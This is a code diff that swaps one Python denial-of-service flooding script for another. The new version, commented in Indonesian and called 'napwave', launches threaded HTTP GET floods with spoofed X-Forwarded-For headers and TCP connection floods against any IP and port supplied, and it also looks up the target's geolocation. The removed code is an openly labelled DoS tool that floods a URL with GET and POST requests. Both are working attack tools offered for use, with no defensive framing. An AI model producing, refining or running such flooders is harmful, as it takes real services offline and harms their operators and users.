@@ -1,143 +1,146 @@
-import requests
-import sys
+#!/usr/bin/env python3
+
 import threading
-import random
-import re
+import socket
 import argparse
+import logging
+import random
+import time
+import signal
+import requests
+from colorama import init, Fore, Style
 
-host=''
-headers_useragents=[]
-request_counter=0
-printedMsgs = []
+# Inisialisasi colorama untuk warna teks di terminal
+init(autoreset=True)
 
-def printMsg(msg):
-	if msg not in printedMsgs:
-		print ("\n"+msg + " after %i requests" % request_counter)
-		printedMsgs.append(msg)
+# Pengaturan logging
+logging.basicConfig(level=logging.INFO, format=f"{Fore.WHITE}%(asctime)s{Style.RESET_ALL} - %(levelname)s - %(message)s")
 
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-	
-def randomString(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+connection_counter = 0
+lock = threading.Lock()
+terminate = False
 
-def initHeaders():
-	useragent_list()
-	global headers_useragents, additionalHeaders
-	headers = {
-				'User-Agent': random.choice(headers_useragents),
-				'Cache-Control': 'no-cache',
-				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-				'Keep-Alive': str(random.randint(110,120)),
-				'Connection': 'keep-alive'
-				}
+# Daftar IP palsu
+fake_ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3', '192.168.1.4']
 
-	if additionalHeaders:
-		for header in additionalHeaders:
-			headers.update({header.split(":")[0]:header.split(":")[1]})
-	return headers
+def signal_handler(sig, frame):
+    global terminate
+    if terminate:
+        print(f"{Fore.RED}Menghentikan program secara paksa...{Style.RESET_ALL}")
+        exit(0)
+    print(f"{Fore.CYAN}Selesai.{Style.RESET_ALL}")
+    terminate = True
 
-def handleStatusCodes(status_code):
-	global request_counter
-	sys.stdout.write("\r%i requests has been sent" % request_counter)
-	sys.stdout.flush()
-	if status_code == 429:
-			printMsg("You have been throttled")
-	if status_code == 500:
-		printedMsg("Status code 500 received")
+signal.signal(signal.SIGINT, signal_handler)
 
-def sendGET(url):
-	global request_counter
-	headers = initHeaders()
-	try:
-		request_counter+=1
-		request = requests.get(url, headers=headers)
-		# print 'her'
-		handleStatusCodes(request.status_code)
-	except:
-		pass
+# Fungsi untuk mendapatkan geolokasi target menggunakan ip-api.com
+def get_geolocation(ip_address):
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip_address}")
+        data = response.json()
+        if data['status'] == 'success':
+            print(f"{Fore.LIGHTBLACK_EX}Geolokasi Target:{Style.RESET_ALL}")
+            print(f"{Fore.LIGHTBLACK_EX}IP:{Style.RESET_ALL} {data['query']}")
+            print(f"{Fore.LIGHTBLACK_EX}Negara:{Style.RESET_ALL} {data['country']}")
+            print(f"{Fore.LIGHTBLACK_EX}Kota:{Style.RESET_ALL} {data['city']}")
+            print(f"{Fore.LIGHTBLACK_EX}ISP:{Style.RESET_ALL} {data['isp']}")
+            print(f"{Fore.LIGHTBLACK_EX}Zona Waktu:{Style.RESET_ALL} {data['timezone']}")
+        else:
+            print(f"{Fore.RED}Gagal mendapatkan geolokasi untuk IP {ip_address}{Style.RESET_ALL}")
+    except requests.RequestException as e:
+        print(f"{Fore.RED}Error saat mengakses API geolokasi: {e}{Style.RESET_ALL}")
 
-def sendPOST(url, payload):
-	global request_counter
-	headers = initHeaders()
-	try:
-		request_counter+=1
-		if payload:
-			request = requests.post(url, data=payload, headers=headers)
-		else:
-			request = requests.post(url, headers=headers)
-		handleStatusCodes(request.status_code)
-	except:
-		pass
+class Ddos(threading.Thread):
+    def __init__(self, target_ip, http_port, fake_ip):
+        super().__init__()
+        self.target_ip = target_ip
+        self.http_port = http_port
+        self.fake_ip = fake_ip
 
-class SendGETThread(threading.Thread):
-	def run(self):
-		try:
-			while True:
-				global url
-				sendGET(url)
-		except:
-			pass
+    def bypass(self):
+        return random.choice(fake_ips)
 
-class SendPOSTThread(threading.Thread):
-	def run(self):
-		try:
-			while True:
-				global url, payload
-				sendPOST(url, payload)
-		except:
-			pass
+    def ddos(self):
+        global connection_counter
+        while not terminate:
+            try:
+                # Layer 7 HTTP GET Flood
+                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                new_socket.settimeout(0.5)
+                new_socket.connect((self.target_ip, self.http_port))
 
+                headers = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
+                headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
+                headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
+                headers += "Accept-Encoding: gzip, deflate\r\n"
+                headers += f"X-Forwarded-For: {self.bypass()}\r\n"
+                headers += "Connection: keep-alive\r\n\r\n"
 
-# TODO:
-# check if the site stop responding and alert
+                new_socket.sendall(headers.encode('ascii'))
+                new_socket.close()
 
-def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
-	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
-	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
-	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
-	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
-	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
-	args = parser.parse_args()
+                with lock:
+                    connection_counter += 1
+                    if connection_counter % 500 == 0:
+                        logging.info(f"{Fore.CYAN}Total koneksi (HTTP GET Flood): {connection_counter}{Style.RESET_ALL}")
 
-	global url, payload, additionalHeaders
-	additionalHeaders = args.ah
-	payload = args.d
+                time.sleep(random.uniform(0.1, 0.5))
 
-	if args.g:
-		url = args.g
-		for i in range(args.t):
-			t = SendGETThread()
-			t.start()
+            except socket.error:
+                logging.error(f"{Fore.RED}Koneksi HTTP GET gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")
 
-	if args.p:
-		url = args.p
-		for i in range(args.t):
-			t = SendPOSTThread()
-			t.start()
-	
-	if len(sys.argv)==1:
-		parser.print_help()
-		exit()
-	
+    def tcp_flood(self):
+        global connection_counter
+        while not terminate:
+            try:
+                # Layer 4 TCP SYN Flood
+                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                new_socket.connect((self.target_ip, self.http_port))
+                new_socket.close()
+
+                with lock:
+                    connection_counter += 1
+                    if connection_counter % 500 == 0:
+                        logging.info(f"{Fore.MAGENTA}Total koneksi (TCP SYN Flood): {connection_counter}{Style.RESET_ALL}")
+
+                time.sleep(random.uniform(0.1, 0.5))
+
+            except socket.error:
+                logging.error(f"{Fore.RED}Koneksi TCP gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")
+
+    def hybrid_attack(self):
+        """ Hybrid method that randomly switches between HTTP GET and TCP SYN flood """
+        if random.choice([True, False]):
+            self.ddos()
+        else:
+            self.tcp_flood()
+
+    def run(self):
+        while not terminate:
+            self.hybrid_attack()
+
+def main():
+    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}napwave the DDos attack{Style.RESET_ALL}", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("-IP", "--target_ip", type=str, required=True, help="IP target")
+    parser.add_argument("-p", "--http_port", type=int, required=True, help="Port target")
+    parser.add_argument("-F", "--fake_ip", type=str, required=True, help="IP palsu")
+    parser.add_argument("-t", "--num_threads", type=int, required=True, help="Jumlah thread")
+
+    args = parser.parse_args()
+
+    print(f"{Fore.CYAN}napwave attack...{Style.RESET_ALL}")
+
+    # Panggil fungsi geolokasi untuk menampilkan info target
+    get_geolocation(args.target_ip)
+
+    threads = []
+    for _ in range(args.num_threads):
+        thread = Ddos(args.target_ip, args.http_port, args.fake_ip)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
 if __name__ == "__main__":
-   main(sys.argv[1:])
+    main()
